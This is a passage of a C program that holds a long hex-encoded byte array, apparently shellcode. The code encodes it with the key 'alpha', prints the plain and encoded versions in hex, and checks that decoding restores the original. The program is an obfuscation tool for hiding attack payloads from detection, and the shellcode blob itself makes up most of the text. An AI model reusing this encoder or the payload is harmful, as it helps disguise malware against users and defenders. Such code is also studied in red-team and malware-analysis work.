	   "\x1b\x2a\x9a\x0c\x6c\xd3\x7e\x94\xbc\x23\x23\x1c\x8e\x22\x87"
	   "\xa4\x93\xc5\x6b\x2c\x30\x60\xc8\xb4\x88\x5d\xac\x3c\x8f\xab"
	   "\x10\xc4\x7d\xb0\xf4\x4c\xb2\x0c\x59\xd4\xd6\x5c\x3d\x5c\x27"
	   "\xae\xe1\xe4\x76\xb3\x45\x6c\x1b\x01\x2a\xf4\xec\x57\x8e\x7c"
	   "\x24\xfd\x72\x04\x7a\xc4\xd6\x8c\x1f\x0e\xbb\x14\xd6\x5f\x1f"
	   "\x9c\x77\x99\xc3\x24\x4e\xe1\xa7\xac\x9f\x70\x04\x34\x83\x4a"
	   "\xe8\xbc\x73\x9f\x4c\x44\x16\xee\x30\xcc\xe0\x20\x95\x54\x3e"
	   "\x24\x79\xdc\x74\x96\xdd\x64\x42\xb4\x81\xec\x9d\x0a\x66\x74"
	   "\xbd\x5d\xca\xfc\x74\x96\xae\x84\x4e\xb0\x12\x0c\x9b\x09\xf7"
	   "\x94\xd0\x46\x5b\x1c\x25\x98\x3f\xa4\x78\xe3\xe3\x2c\x1f\x24"
	   "\x40\xb4\xee\x2c\x24\x3c\x75\x86\x88\xc4\x47\x8a\x6c\x4c\x98"
	   "\x7d\xd1\xd4\xea\xe3\xb5\x5c\x6d\xd2\x19\xe4\x41\x78\xfe\x6c"
	   "\xc4\x4b\xa2\xf4\x3e\x82\x06\x7c\x0f\xd3\xea\x04\x5b\x16\x4f"
	   "\x8c\xc7\x39\x33\x14\x6b\xdc\x97\x9c\x5c\x46\x74\x24\x9b\xe5"
	   "\xd8\xac\xec\xd8\xbc\x34\x25\x79\x61\xbc\x2f\x1e\xc5\x44\x83"
	   "\xd5\xa9\xcc\x82\x71\x0e\x54\x26\x42\xf2\xdc\x9f\xd4\x56\x64"
	   "\xd5\x7c\x3b\xec\x24\x4e\x9f\x74\x21\xd1\x43\xfc\x9d\x74\x20"
	   "\x84\xec\x47\x84\x0c\x6e\xcd\x68\x94\x40\x6b\xcd\x1c\x98\x4a"
	   "\xb1\xa4\xbf\x94\x15\x2c\x78\xdc\xf9\xb4\x4d\x27\x5e\x3c\x97"
	   "\x66\x02\xc4\x82\xb8\xe6\x4c\x2e\xdc\x4a\xd4\x83\x2d\x2f\x5c"
	   "\xdc\x69\x93\xe4\x2e\xba\x77\x6c\x2c\xd8\xdb\xf4\x85\x2a\xb8"
	   "\x7c\x8e\x61\x1c\x04\x2a\xb4\xc0\x8c\xd6\x88\xa4\x14\x27\x8d"
	   "\x08\x9c\x74\x2f\xed\x24\x18\x9b\x51\xac\xe7\x86\x35\x34\x21"
	   "\x7b\x9a\xbc\x63\x1f\x7e\x44\xb3\xe8\x22\xcc\xdf\x26\x87\x54"
	   "\x18\x72\x6b\xdc\x69\x44\xcf\x64\xeb\xd5\xb3\xec\xd8\x70\x10"
	   "\x74\x7b\x4a\xf4\xfc\xe2\xc8\x58\x84\xd2\x76\x3d\x0c\x2d\x46"
	   "\xe1\x94\x68\x9b\x45\x1c\xea\xee\x29\xa4\xda\x76\x8e\x2c\x45"
	   "\x13\x72\xb4\xed\xb9\xd6\x3c\xd7\x04\xbb\xc4\x43\x44\x1f\x4c"
	   "\xbb\x9e\xc3\xd4\xf0\xbf\xa7\x5c\x93\x07\x04\xe4\x3f\x4a\xe8"
	   "\x6c\xf2\x92\x4c\xf4\x93\xdb\x30\x7c\x37\x2c\x95\x04\xd2\x7c"
	   "\x79\x8c\x2d\x19\xdd\x14\x2a\x82\x81\x9c\x87\x72\x66\x24\xde"
	   "\x1b\xca\xac\x7c\xe5\xae\x34\xb3\x26\x13\xbc\x8b\x7e\xf7\x44"
	   "\xdc\x4e\x5b\xcc\x2a\x99\x3f\x54\x37\xd2\xe3\xdc\x83\x7a\x40"
	   "\x64\xdb\xe1\x24\xec\x47\x82\x88\x74\xea\x78\x6d\xfc\xd3\x45"
	   "\xd1\x84\x47\xd7\xb5\x0c\xb9\x21\x1a\x94\xdf\x74\xfe\x1c\x46"
	   "\xe4\xa2\xa4\xe7\x8e\x06\x2c\xdf\x7c\xeb\xb4\x7e\xe0\x4f\x3c"
	   "\xb8\x81\x33\xc4\x8c\x23\x90\x4c\xc7\xce\x74\xd4\x1f\x73\xd9"
	   "\x5c\x02\x4b\xbd\xe4\xf5\x99\x61\x6c\x99\xe4\xc5\xf4\x3f\x2e"
	   "\xaa\x7c\xf7\x69\x0e\x04\xc6\xba\xf2\x8c\x4c\xde\x56\x14\xbe"
	   "\x43\x3b\x9c\xa2\xb4\x9f\x24\x47\x8d\x43\xac\xb1\x97\x27\x34"
	   "\xd8\x6f\x84\xbc\x11\xf4\x68\x44\x6e\xcd\xcc\xcc\xbb\x19\xb1"
	   "\x54\xfd\x51\x15\xdc\x9b\xa2\xf9\x64\x01\xf4\x5d\xec\xad\x94"
	   "\x01\x74\x16\x6e\xe6\xfc\x07\xf3\x4a\x84\xfe\xca\x2e\x0c\x38"
	   "\x18\x93\x94\x5f\x03\x77\x1c\x94\xf0\xdb\xa4\xe5\xcf\xbf\x2c"
	   "\x3f\x04\x1c\xb4\x0f\x57\xc0\x3c\x15\xf5\xa4\xc4\xe0\x98\x08"
	   "\x4c\x69\x39\xed\xd4\x0f\x8b\x51\x5c\xe6\xc5\x35\xe4\x64\x13"
	   "\x9a\x6c\x0b\x50\x7e\xf4\xfb\xf5\x22\x7c\x98\xcd\x86\x04\x56"
	   "\x16\x6b\x8c\xf3\x05\xcf\x14\x9e\xad\xb3\x9c\x68\x1b\x10\x24"
	   "\xa1\x07\xf4\xac\xac\xf6\x58\x34\x1f\xca\x3c\xbc\x69\x4a\xe1"
	   "\x44\xf2\xf3\x45\xcc\xce\x97\x29\x54\x16\x60\x8e\xdc\x50\xf5"
	   "\x72\x64\xc7\xc3\xd6\xec\x37\x48\xbb\x74\x0f\xa1\x1f\xfc\x5e"
	   "\xa0\xc3\x84\xc6\x40\xa0\x0c\x66\xe0\x04\x94\x0a\x8e\xe8\x1c"
	   "\xf3\x28\x4d\xa4\x60\x8d\x31\x2c\x03\x8c\x95\xb4\xaa\x28\x7a"
	   "\x3c\x1b\xd0\xde\xc4\x06\x29\x83\x4c\xfb\x7c\x67\xd4\x9a\x1a"
	   "\xcb\x5c\x6b\x85\xaf\xe4\xa4\x2a\x0c\x6c\xfa\xca\xf0\xf4\x9e"
	   "\x26\x55\x7c\x6f\x7e\x39\x04\xbb\xb4\x9d\x8c\xa1\x81\x41\x14"
	   "\x15\x8b\x25\x9c\x6a\x7f\x8a\x24\xb5\x4d\x6e\xac\xa6\x81\xd2"
	   "\x34\x19\xd2\xb6\xbc\x6d\x23\x1b\x44\xec\x26\xff\xcc\x96\x98"
	   "\xa3\x54\x35\xec\x07\xdc\xd8\x3c\xe4\x64\x2e\x77\x48\xec\x36"
	   "\x11\x2c\x74\xd3\xe8\x90\xfc\x2f\x2b\x75\x84\x7c\x7a\xd9\x0c"
	   "\xe0\x45\xbd\x94\x84\xd4\x61\x1c\x79\x27\xc6\xa4\x49\x77\xaa"
	   "\x2c\x9e\x47\x0e\xb4\xee\x97\xf2\x3c\x3b\xe9\x56\xc4\x21\x31"
	   "\x3b\x4c\x96\x71\x9f\xd4\xe7\x41\x43\x5c\x38\x92\x27\xe4\x08"
	   "\xe2\x8b\x6c\x5d\x33\x68\xf4\xff\x0a\xcc\x7c\x34\x5d\xb0\x04"
	   "\x04\xad\x14\x8c\x54\xfd\xf8\x14\xa5\xcd\x5c\x9c\xf1\x1c\x01"
	   "\x24\x98\x3f\xe5\xac\x69\xf8\x49\x34\xf3\xcc\x2d\xbc\xc6\x1f"
	   "\x92\x44\x4c\x55\x76\xcc\xe8\xf3\xda\x54\x91\xce\xbe\xdc\x6d"
	   "\x09\x63\x64\xb7\x5a\xc7\xec\xf2\xaf\xab\x74\xc8\xfc\x0f\xfc"
	   "\x06\x3b\xec\x84\x5e\x02\x50\x0c\xfa\x43\x34\x94\x30\x94\x98"
	   "\x1c\x01\xdd\x7c\xa4\x17\x2c\x21\x2c\xec\x76\x85\xb4\x34\xbe"
	   "\x69\x3c\x21\xa1\xcd\xc4\x9d\x10\xb2\x4c\xbc\x6a\x16\xd4\x70"
	   "\xbb\xfa\x5c\x43\x8b\x5e\xe4\x93\xdb\x02\x6c\xe4\x2b\xe7\xf4"
	   "\x30\x75\x4b\x7c\x01\xbc\x2f\x04\x17\x87\x93\x8c\xe3\xc6\x77"
	   "\x14\x6e\x48\xd4\x9c\x5f\xb8\xb8\x24\x99\x8a\x1c\xac\xe1\xcb"
	   "\xc0\x34\x77\x1e\xa5\xbc\x11\x38\x09\x44\xba\xf1\xed\xcc\x76"
	   "\xc2\x51\x54\x4f\x01\x36\xdc\xcc\x51\x9a\x64\x21\xaa\x7e\xec"
	   "\x7d\xff\x22\x74\x1d\xcf\x86\xfc\xd6\x1b\x6b\x84\x7a\x52\xcf"
	   "\x0c\x4d\xac\xb3\x94\x89\xb2\x17\x1c\xda\x05\xf4\xa4\x2e\x52"
	   "\x58\x2c\x7f\x93\x3c\xb4\x1c\xe0\xe0\x3c\xdb\x33\x45\xc4\x78"
	   "\x0c\x29\x4c\x48\x59\x8d\xd4\xd2\x96\x71\x5c\x2e\xe1\xd5\xe4"
	   "\x65\x29\xba\x6c\xb3\x71\x1e\xf4\x8f\xb9\xc2\x7c\xc0\x8c\xa6"
	   "\x04\x10\xdf\x0a\x8c\x60\x2f\xef\x14\xb1\x7f\x53\x9c\x81\x4f"
	   "\x37\x24\xd7\x9f\x9b\xac\x74\xd3\x7f\x34\x1e\x2b\xdc\xbc\xd9"
	   "\x2d\x80\x44\x7c\xd6\x64\xcc\xe6\x70\xc9\x54\x81\x1a\xad\xdc"
	   "\x7e\xd2\x11\x64\xb2\x23\xf6\xec\x87\x79\x5a\x74\xda\x18\x3e"
	   "\xfc\x29\xd2\xe2\x84\x7e\x22\x47\x0c\xb3\x2f\x2b\x94\x80\x9e"
	   "\x8f\x1c\xd5\x85\x73\xa4\x2a\x74\xd0\x2c\x7e\x4b\xb4\xb4\xb0"
	   "\x9b\x18\x3c\x83\xea\xfc\xc4\xd5\x3e\xa1\x4c\x2f\x06\x05\xd4"
	   "\x2b\x4c\x97\x1f\xbe\xac\xd7\x5f\xbe\xac\xd7";



    int buf_len = strlen((const char*)plain);
    unsigned char key[] = "alpha";
    int key_len = strlen((const char*)key);


	unsigned char* encrypted = do_thing(plain, key);

    printf("Taking plain shellcode:\n");
	print_in_hex(plain);

	printf("New encoded version:\n");
	print_in_hex(encrypted);

	unsigned char* test = do_thing(encrypted, key);

	if (memcmp(plain, test, buf_len) != 0) {
		printf("Strings do not match. error\n");
	}
	else {
		printf("Strings match. Good to go.\n");
	}

	
	return;
}
